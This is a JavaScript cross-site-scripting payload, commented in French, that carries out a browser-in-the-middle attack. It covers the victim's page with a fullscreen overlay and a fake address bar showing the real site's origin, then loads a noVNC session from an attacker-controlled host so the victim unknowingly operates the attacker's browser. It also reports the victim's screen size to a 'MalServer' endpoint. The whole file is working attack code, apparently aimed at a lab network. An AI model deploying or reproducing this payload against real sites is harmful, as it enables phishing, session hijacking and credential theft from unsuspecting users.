(function() {
    console.log('[BiTM XSS] Injecting noVNC iframe...');
    
    // Configuration - Remplacer par l'IP réelle de VM1
    const ATTACKER_IP = '192.168.100.10';
    const NOVNC_PORT = 6080;
    
    // Créer overlay fullscreen
    const overlay = document.createElement('div');
    overlay.id = 'bitm-overlay';
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 999999;
        background: white;
        display: flex;
        flex-direction: column;
    `;
    
    // Barre d'adresse fake (pour crédibilité)
    const fakeAddressBar = document.createElement('div');
    fakeAddressBar.style.cssText = `
        height: 40px;
        background: #f1f3f4;
        border-bottom: 1px solid #dadce0;
        display: flex;
        align-items: center;
        padding: 0 12px;
        font-family: Arial, sans-serif;
        font-size: 14px;
    `;
    fakeAddressBar.innerHTML = `
        <div style="flex: 1; background: white; border-radius: 20px; padding: 8px 16px; display: flex; align-items: center;">
            <svg width="16" height="16" style="margin-right: 8px;"><circle cx="8" cy="8" r="6" fill="#0f9d58"/></svg>
            <span style="color: #5f6368;">${window.location.origin}</span>
        </div>
    `;
    
    // Iframe noVNC
    const iframe = document.createElement('iframe');
    iframe.src = `http://${ATTACKER_IP}:${NOVNC_PORT}/vnc_lite.html?autoconnect=true&resize=scale`;
    iframe.style.cssText = `
        width: 100%;
        flex: 1;
        border: none;
    `;
    
    // Assembler
    overlay.appendChild(fakeAddressBar);
    overlay.appendChild(iframe);
    document.body.appendChild(overlay);
    
    // Masquer le contenu original
    document.body.style.overflow = 'hidden';
    
    console.log('[BiTM XSS] noVNC iframe injected successfully');
    
    // Envoyer confirmation à MalServer
    fetch(`http://${ATTACKER_IP}:3000/postScreenSize`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            width: window.innerWidth,
            height: window.innerHeight,
            injected: true,
            timestamp: new Date().toISOString()
        })
    }).catch(err => console.error('[BiTM XSS] Failed to notify MalServer:', err));
    
})();